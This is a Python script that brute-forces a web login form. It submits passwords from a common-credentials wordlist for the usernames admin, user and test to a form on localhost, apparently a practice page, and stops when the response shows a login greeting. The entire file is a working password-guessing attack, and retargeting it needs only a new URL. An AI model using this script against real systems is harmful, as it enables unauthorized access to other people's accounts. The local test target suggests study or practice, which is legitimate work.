import requests
import sys

target = "http://127.0.0.1:5500/testLoginForm.html"
usernames = ["admin", "user", "test"]
passwords = "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
needle = "Welcome back"

for username in usernames :
	with open(passwords, "r") as passwords_list:
		for password in passwords_list : 
			password = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {} : {}\r".format(username, password.decode()))
			sys.stdout.flush()
			r = requests.post(target, data={"username":username, "password":password})
			if needle.encode() in r.content :
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>] Valid Password '{}' found for user '{}'!".format(password.decode(), username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password found for '{}'!".format(username))